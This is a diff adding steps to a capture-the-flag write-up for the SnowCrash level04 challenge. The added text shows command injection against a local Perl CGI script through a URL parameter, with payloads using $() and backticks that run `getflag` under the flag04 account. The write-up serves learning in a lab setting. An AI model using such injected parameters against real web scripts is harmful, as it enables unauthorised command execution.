@@ -50,9 +50,24 @@ Easy enough right? We can start interacting with the script in a meaningful way 
 
 If proper input sanitization is not made this script could be vulnerable to command injections. Since it runs with the priviliges of `flag04` the consequences could be severe. Let's exploit!
 
+Our goal is to run `getflag` as `flag04` somehow. A naive first attempt would be to simply try `level04@SnowCrash:~$ curl http://localhost:4747?x=getflag`
+
+![image](https://github.com/user-attachments/assets/1cb59aef-72ea-4ac6-ad08-f7d02426af4f)
+
+This is the same as running `echo getflag`, it doesn't run `getflag` but simply prints it out as any other string. How do we subsitute commands in shell-scripting? By using $() or backticks!
+
+![image](https://github.com/user-attachments/assets/ae0eac71-be2a-4d01-b18e-500eac4988ce)
+
+This didn't exactly go as intended because `getflag` was run as level04 before the script and the resulting string was put as parameters in the URL
+
+`curl 'http://localhost:4747?x=$(getflag)'`
+
+![image](https://github.com/user-attachments/assets/f314e30b-c37a-4d4c-af35-940a683f8e3e)
+
 ```
 level04@SnowCrash:~$ curl 'http://localhost:4747/level04.pl?x=`getflag`'
 ```
+
 ![image](https://github.com/user-attachments/assets/390db6a7-889b-4a9b-99f1-7a325288c15b)
 
 ![image](https://github.com/user-attachments/assets/f252564f-cfb3-4278-976d-06e83465f6b9)
